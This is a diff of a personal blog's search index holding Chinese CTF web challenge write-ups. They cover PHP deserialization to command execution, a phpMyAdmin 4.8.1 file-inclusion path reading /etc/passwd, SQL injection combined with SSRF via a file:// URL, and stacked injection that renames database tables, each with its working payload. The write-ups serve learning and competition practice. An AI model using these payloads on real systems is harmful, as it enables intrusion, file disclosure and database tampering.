-    <content><![CDATA[<h1 id="网鼎杯朱雀组-easyweb"><a href="#网鼎杯朱雀组-easyweb" class="headerlink" title="[网鼎杯朱雀组]_easyweb"></a>[网鼎杯朱雀组]_easyweb</h1><p>此题也考到了反序列化</p>
-<p>进入题目是这样</p>
-<p><img src="/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/1.png" alt="1"></p>
-<p>啥也没有抓个包看看</p>
-<p><img src="/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/2.png" alt="1"></p>
-<p>可以看到传送过去了两个参数，根据页面回显以及date()</p>
-<p>可以看出这视一个命令执行，原页面返回了现在的时间</p>
-<p>那我们试试先执行一些函数看看</p>
-<p><img src="/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/3.png" alt="1"></p>
-<p>返回了hacker</p>
-<p>好像过滤了一些函数</p>
-<p>看看能不能拿到源码</p>
-<p>用file_get_contents</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到过滤了system，有点不知所措，但是上面给了一个Test类，那么看看可不可以用一下序列化来绕过这个func的过滤，因为p中完全的没有过滤，而且也没有过滤unserialize，构造一个php：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line">        <span class="variable">$a</span>-&gt;p = <span class="string">&#x27;ls../../../../../&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
-
-<p>这样我们就把func跟p的内容覆盖了，我们让序列化传送给p也可以绕过func的检测</p>
-<p>也就是</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload:func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:17:&quot;ls../../../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/4.png" alt="1"></p>
-<p>可以看到成功执行了，那么我们只需要改序列化中的</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">s:17:&quot;ls../../../../../&quot;;</span><br><span class="line">s:20:&quot;find / -name &#x27;flag*&#x27;&quot;;</span><br><span class="line">s:22:&quot;cat /tmp/flagoefiu4r93&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>最终拿到flag：</p>
-<p><img src="/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/6.png" alt="1"></p>
+<p>最后得到</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/7.png" alt="7"></p>
+<p>最后用get方式传进str</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/9.png" alt="9"></p>
+<p>最后进行base64解码就行了</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/11.png" alt="11"></p>
+<p>flag{242b88d2-1121-4c83-a6e4-7685dc25adfb}</p>
 ]]></content>
       <tags>
         <tag>网鼎杯</tag>
       </tags>
   </entry>
   <entry>
-    <title>我有一个数据库</title>
-    <url>/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    <content><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>首先进去是遗传乱码</p>
-<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="1"></p>
-<p>应该是编码问题</p>
-<p>看了一下robots.txt</p>
-<p>里面藏了一个东西</p>
-<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="1"></p>
-<p>但是里面好像啥也没有</p>
-<p>还是扫描一下把</p>
-<p>可以看到里面有一个phpmyadmin页面</p>
-<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt="1"></p>
-<p>这里右边直接就给数据库版本服务器版本以及phpadmin版本</p>
-<p>找了半天数据库5.5.62也没啥漏洞，最后看了一下phpmyadmin4.8.1有漏洞</p>
-<p>去网上直接用就行了</p>
-<p>简单来说就是</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个文件包含漏洞</span><br><span class="line">他必须传入target参数</span><br><span class="line">在后面添加?进行截断</span><br><span class="line">’$target=db_sql.php?/../../被包含文件’</span><br><span class="line">就可以读取到文件</span><br><span class="line">但是windows文件不能用特殊字符可以经过两次编码</span><br><span class="line">这样在最后一个判断的时候就可以判断为db_sql.php符合条件就可以文件包含</span><br></pre></td></tr></table></figure>
+    <title>fakebook</title>
+    <url>/2022/01/31/fakebook/</url>
+    <content><![CDATA[<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>今天的第二条</p>
+<p>先看看题目</p>
+<p><img src="/2022/01/31/fakebook/1.png" alt="1"></p>
+<p>页面上有些登录信息以及两个网页</p>
+<p>join创建账户</p>
+<p><img src="/2022/01/31/fakebook/2.png" alt="1"></p>
+<p><img src="/2022/01/31/fakebook/7.png" alt="1"></p>
+<p>login登录</p>
+<p>登上去试试</p>
+<p><img src="/2022/01/31/fakebook/6.png" alt="1"></p>
+<p>可以看到这里面注入都没啥用</p>
+<p>用户名可以点击</p>
+<p>进去看看</p>
+<p><img src="/2022/01/31/fakebook/8.png" alt="1"></p>
+<p>可以看到以get方式传入了一个no</p>
+<p>测试一下sql注入</p>
+<p>发现屏蔽了空格可以用/**/绕过</p>
+<p>看一下列数</p>
+<p><img src="/2022/01/31/fakebook/3.png" alt="1"></p>
+<p>看到有4列而且2在页面上回显了</p>
+<p>看到有sql注入漏洞</p>
+<p>进行注入</p>
+<p><img src="/2022/01/31/fakebook/4.png" alt="1"></p>
+<p><img src="/2022/01/31/fakebook/5.png" alt="1"></p>
+<p>可以看到库表列，下面写一下我拿到的结果</p>
+<p>fakebook,information_schema,mysql,performance_schema,test    库</p>
+<p>fakebook里面含有users里面是我们注册时账号密码</p>
+<p>但是可以看到</p>
+<p><img src="/2022/01/31/fakebook/11.png" alt="1"></p>
+<p>可以看到里面时我们的账号密码以及data</p>
+<p>我们的密码时按照序列化显示的</p>
+<p>到这里卡住了</p>
+<p>想想别的办法</p>
+<p>查看一下robots.txt看看网页有没有设置机器人</p>
+<p><img src="/2022/01/31/fakebook/9.png" alt="1"></p>
+<p>一看还真有</p>
+<p>里面给出了提示有一个uesr.php的备份文件</p>
+<p>我们输入这个网址可以下载到这个文件的源代码</p>
+<p>看一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>直接用他们的脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../etc/passwd </span><br><span class="line">他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录</span><br><span class="line">所以要多加一个../来跳出此目录，执行后面语句。</span><br></pre></td></tr></table></figure>
+<p>可以看到我们传入了三个参数，name，age以及blog而blog会读取我们输入的地址</p>
+<p>他的主要工作是建立会话判断一下是不是有效请求，不是就返回404，curl_exec这里是可能存在ssrf漏洞的</p>
+<p>可以用ssrf来伪文件读取</p>
+<p>可是我们怎么知道flag的文件地址呢</p>
+<p>试一下御剑</p>
+<p>可以看到flag.php就在文件当中，而之前的报错中可以看到大部分的网页全部都是存储再/var/www/html/中的</p>
+<p>我们可以来读一度这里的文件</p>
+<p>之前看到我们在之前注入的第四位是data，这个里面包含了博客的网址，如果其中有数就会读取出来</p>
+<p>而他又是序列化之后的结果，我们可以更改里面的数据让他读取的文件变成flag.php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;paixiaoxing.github.io“;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="1"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../flag </span><br></pre></td></tr></table></figure>
+<p>改成：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt="1"></p>
-<p>拿到flag</p>
+<p>就可以再回显的页面直接读取到flag.php里面的代码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在源代码里面发现了base64加密过的flag</p>
+<p>拿到解密文件里面解密一下就可以拿到flag了</p>
+<p>后来我回头又看了一下，知道了flag的路径，我们是不是也可以用load_file()这个函数直接读取flag里面的值呢</p>
+<p>看一下权限</p>
+<p><img src="/2022/01/31/fakebook/12.png" alt="1"></p>
+<p>发现居然是root权限那么应该可行</p>
+<p><img src="/2022/01/31/fakebook/13.png" alt="1"></p>
+<p>发现这样也可以拿到flag</p>
+<p>之前的需要base64解码一下</p>
 ]]></content>
-      <tags>
-        <tag>GWCTF</tag>
-      </tags>
   </entry>
   <entry>
     <title>禁止套娃</title>
@@ -1033,5 +826,102 @@
 <p>就可以拿到flag了</p>
 <p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/5.png" alt="1"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>蛛蛛...嘿嘿♥我的蛛蛛</title>
+    <url>/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/</url>
+    <content><![CDATA[<h1 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><p>进去之后先看看</p>
+<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/1.png" alt="1"></p>
+<p>点了一下，发现方框变多但是只有一个是真的</p>
+<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/2.png" alt="1"></p>
+<p>查看源代码的时候可以看到哪个是真的</p>
+<p>但是一直点也不知道什么时候结束，写一个简单的爬虫脚本方便我们直接得到那个页面</p>
+<p>附上我的脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开发时间：2022/2/6:16:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/714c5754f1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    urrl = url + key</span><br><span class="line">    uuu = re.<span class="built_in">compile</span>(<span class="string">&#x27;href=&quot;(.*?)&quot;&#x27;</span>)   <span class="comment">#匹配括号中的内容</span></span><br><span class="line">    r = requests.get(url=urrl)          <span class="comment">#用get方式传入参数</span></span><br><span class="line">    l = re.findall(uuu, r.text)    <span class="comment">#在r.text中匹配UUU规则中的数据</span></span><br><span class="line">    <span class="built_in">print</span>(urrl)                 <span class="comment">#查看访问网址</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> l <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>]  <span class="comment">#从l中提取数据直到他为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = key[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>直接访问最后一个网页</p>
+<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/4.png" alt="1"></p>
+<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/3.png" alt="1"></p>
+<p>最后找flag就简单了慢慢找呗，最后发现flag是在请求头里面</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>随便注</title>
+    <url>/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>首先进入题目：</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt="1"></p>
+<p>看起来是sql注入先试试看看有啥报错</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt="1"></p>
+<p>看起来是单引号字符型漏洞</p>
+<p>测试一下他的列数</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt="1"></p>
+<p>4看起来不行</p>
+<p>测试了一下2的时候可以正常回显</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt="1"></p>
+<p>所以列数是2，用select看看有没有回显的地方</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt="1"></p>
+<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
+<p>但是没有过滤show所以考虑到堆叠注入</p>
+<p>看一看库</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
+<p>表：</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
+<p>发现其中有两个表</p>
+<p>看看里面有啥</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.png" alt="1"></p>
+<p>发现单引号不行，测试一下双引号还有反撇号</p>
+<p>发现反撇号`可以</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt="1"></p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/12.png" alt="1"></p>
+<p>可以看到1919这个表这里面含有flag但是输出的时候输出的是words表中的数据</p>
+<p>而这题又屏蔽了一些可以用的函数</p>
+<p>想想其他办法</p>
+<p>我们可以重命名表然后把表中的flag改成id这样查询就可以直接查询到id的数据而id的数据就是flag</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=1&#x27;;RENAME TABLE `words` TO `word1`;RENAME `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100)SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from `words`;#`</span><br></pre></td></tr></table></figure>
+
+<p>就可以直接输出flag了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;39e1f712-9675-492f-9e7a-7cb9ece7ba2f</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>Newcalc0</title>
+    <url>/2022/02/15/Newcalc0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>GameV4.0</title>
+    <url>/2022/02/13/GameV4-0/</url>
+    <content><![CDATA[<h1 id="GAME-V4-0"><a href="#GAME-V4-0" class="headerlink" title="GAME V4.0"></a>GAME V4.0</h1><p>web的第一道签到题：</p>
+<p>打开页面可以看到是一个小游戏：</p>
+<p>直接看源代码把</p>
+<p><img src="/2022/02/13/GameV4-0/1.png" alt="1"></p>
+<p>没什么别的问题，那就看看他的这些子文件中有没有什么信息</p>
+<p>最后在data.js中发现</p>
+<p><img src="/2022/02/13/GameV4-0/2.png" alt="1"></p>
+<p>含有flag名称的新型</p>
+<p>解码一下得到flag</p>
+<p><img src="/2022/02/13/GameV4-0/3.png" alt="1"></p>
+]]></content>
+      <tags>
+        <tag>V&amp;NCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GOclac</title>
+    <url>/2022/02/15/GOclac/</url>
+    <content><![CDATA[<h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>这道题目据说是出题的时候出错了；</p>
+<p>首先打开题目</p>
+<p><img src="/2022/02/15/GOclac/1.png" alt="1"></p>
+<p>查看他的提示</p>
+<p><img src="/2022/02/15/GOclac/2.png" alt="1"></p>
+<p>他提示了flag在session中</p>
+<p>我们直接抓包发包，拿到服务器端返回的session值，这次的题目返回没有进行加密</p>
+<p>可以直接拿到解码，经过二次解码得到flag</p>
+<p><img src="/2022/02/15/GOclac/3.png" alt="1"></p>
+]]></content>
+      <tags>
+        <tag>V&amp;NCTF</tag>
+      </tags>
   </entry>
 </search>
